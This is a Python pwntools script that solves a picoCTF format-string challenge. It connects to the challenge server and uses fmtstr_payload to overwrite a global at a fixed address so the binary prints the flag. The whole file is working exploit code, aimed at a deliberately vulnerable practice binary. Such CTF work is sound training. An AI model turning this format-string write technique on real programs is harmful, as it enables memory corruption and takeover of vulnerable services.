#!/usr/bin/env python3
from pwn import *

port = 56458
offset = 14

# set the related info of elf file to pwntools
context.log_level = "critical"
context.binary = ELF('./vuln')

# connet to webshell
p = remote('rhea.picoctf.net', port)

# set function so pwn can automate the process
def exec_fmt(payload):
    p = remote('rhea.picoctf.net', port)
    p.sendline(payload)
    return p.recvall()

'''
# we can know the offset in the elf file
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
'''

# fmtstr_payload(offset, {address: value})
payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

# print(payload)

p.sendline(payload)

flag = p.recvall()

print("Flag: ", flag)
